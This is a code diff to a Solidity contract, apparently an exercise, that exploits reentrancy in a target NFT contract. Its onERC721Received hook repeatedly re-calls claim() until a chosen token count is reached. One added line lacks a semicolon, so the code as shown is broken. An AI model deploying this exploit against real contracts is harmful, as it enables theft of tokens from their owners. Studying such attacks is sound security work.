@@ -2,10 +2,11 @@
 
 pragma solidity 0.8.24;
 
-contract NFTHack{
+contract NFTReentrancyHack{
 
     address public target;
     uint8 public counter;
+    uint8 public nbTokens;
     
 
     constructor(address _target){
@@ -16,10 +17,10 @@ contract NFTHack{
     function buy() external payable {
         (bool success, )  = target.call{value: msg.value}(abi.encodeWithSignature("buy()"));
         require(success, "Buying NFT FAILED"); 
-        
     }
 
-    function claim() external {
+    function claim(uint _nbTokens) external {
+        nbTokens=_nbTokens
         (bool success, )  = target.call(abi.encodeWithSignature("claim()"));
         require(success, "Hacking claim NFT failed in claim"); 
     }
@@ -32,7 +33,7 @@ contract NFTHack{
         // target.call(abi.encodeWithSignature("balanceOf(address)",addr));
         counter+=1;
         
-        if(counter>0){
+        if(counter>=nbTokens){
             return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
         }
         (bool success, )  = target.call(abi.encodeWithSignature("claim()"));
